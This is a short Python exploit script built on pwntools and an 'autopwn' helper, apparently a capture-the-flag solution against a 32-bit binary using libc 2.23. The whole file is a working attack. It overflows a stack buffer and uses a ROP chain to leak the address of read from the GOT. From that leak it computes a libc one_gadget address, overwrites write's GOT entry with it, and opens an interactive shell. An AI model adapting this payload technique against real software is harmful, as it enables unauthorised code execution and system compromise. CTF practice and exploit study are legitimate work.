from pwn import *
from autopwn.core import pwn
from sys import argv

def leak(self, a):
    pass


def exp(self, a):
    read_got = self.elf.got['read']
    write_got = self.elf.got['write']
    write_plt = self.elf.plt['write']
    read_plt = self.elf.plt['read']
    esp_c = 0x080482ee
    read_offset = self.lib[0].symbols['read']
    one_offset = 0x3a80c

    a.rl()
    payload = 'a' * 0x88
    payload += 'a' * 4
    payload += p32(write_plt) + p32(esp_c)
    payload += p32(1) + p32(read_got) + p32(4)
    payload += p32(read_plt) + p32(write_plt)
    payload += p32(0) + p32(write_got) + p32(4)

    a.sl(payload)

    read_addr = unpack(a.recvn(4), 'all')
    a.lg("Got read addr: ", read_addr)
    one_addr = read_addr + one_offset - read_offset

    a.send(p32(one_addr))
    

def get_flag(self, a):
    a.interactive()
    return

pwn.ctf(argv, exp, get_flag,
        bp=0x080484a6,
        inter='../libc6-i386_2.23-0ubuntu10_amd64/ld-2.23.so',
        needed=['../libc6-i386_2.23-0ubuntu10_amd64/libc-2.23.so'])
